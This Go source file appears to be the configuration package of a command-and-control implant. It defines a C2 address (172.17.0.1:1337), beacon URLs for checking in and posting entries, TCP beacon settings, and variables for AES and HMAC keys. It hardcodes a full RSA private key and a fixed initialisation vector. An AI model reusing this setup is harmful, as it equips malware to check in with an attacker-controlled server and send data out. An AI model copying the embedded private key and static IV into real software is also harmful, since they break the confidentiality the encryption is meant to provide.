package config

import (
	"time"
)

var (
	RsaPublicKey = []byte(`
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCQ0Fu5inpm19vq/4e3XinZ2cwCIuo2kIB7t9Ju
s71nNMYkm6IpB/IBGNUK6OYY50SY2ZOKoPQmSt1iveaCTs3W9kRfphMQAZlR5HUqbSZOWA0TOC9Q
x/Qa8TPxfWxJa3x51wDdI88tJ8kGA7g77sSl0jdeZwsA2rY7U5gSizzvSQIDAQAB
-----END PUBLIC KEY-----	
	`)
	RsaPrivateKey = []byte(`
-----BEGIN PRIVATE KEY-----
MIICdQIBADANBgkqhkiG9w0BAQEFAASCAl8wggJbAgEAAoGBAJDQW7mKembX2+r/h7deKdnZzAIi
6jaQgHu30m6zvWc0xiSboikH8gEY1Qro5hjnRJjZk4qg9CZK3WK95oJOzdb2RF+mExABmVHkdSpt
Jk5YDRM4L1DH9BrxM/F9bElrfHnXAN0jzy0nyQYDuDvuxKXSN15nCwDatjtTmBKLPO9JAgMBAAEC
gYAW8lkygZmrLbW8m1CVUw+1JECiLwenbUbas9JdtdADqFZkax/rOgXUPCvX/nclh5H0WXe6Xg5J
+g9yC87Yo6WUlsH6RrXi/0wTZaE9gbIGBlha8YThz7zklNgtJ8ogxI8+i1jDovD4VGbUdoEpmUfV
KR+DFwsEvgD4nj2Td6FbXQJBAKtOjNGj6HmIlMBNyk2nsqoxE8NVdvs370/orUmmv1RiCs5UB/Nm
PGxfOUqTbKFgsJw3wRm5aI7ghxLzWsttCoUCQQDYaLrLzVlV3Fl7en2s9noYO9LXHDE2DCm2tbfI
ItTr6EV+amKN7dYUrb+y70bD2VNDhyZFT3rsYowx2QRcc8b1AkA2p2f8Fow8AhxbQjZSEjfJXsEM
Z/7+5XifiP+IaP/P/zutWlfzCuIqPTM9HM3iqsOOA6fC+klmlDHkFOoZzt81AkAaM7wCNw/M/Iv9
DlyvF3y6+GtTzj8LGzflvmTNH6KGGa5oWvsp0hUslcjzIlOAHQ0ezPtOQwxQGLJ+ypbjlsUNAkAt
O2T3g2l5uvNrEThXN9h8XN3clkDi93eawdtDf5cUu4v86nsv906ljdLQlu9ybaJya3RoU5rGfvWx
j1jY9vDS
-----END PRIVATE KEY-----
	`)


	C2        = "172.17.0.1:1337"
	plainHTTP = "http://"
	sslHTTP   = "https://"
	GetUrl    = plainHTTP + C2 + "/api/v1/status"
	PostUrl   = plainHTTP + C2 + "/api/v1/entry?id="
	WaitTime  = 10000 * time.Millisecond
	VerifySSLCert = true
	TimeOut time.Duration  = 10 //seconds

	IV        = []byte("abcdefghijklmnop")
	GlobalKey []byte
	AesKey    []byte
	HmacKey   []byte
	Counter   = 0
	TcpBeacons []TcpBeacon
)

const (
	DebugMode = true
)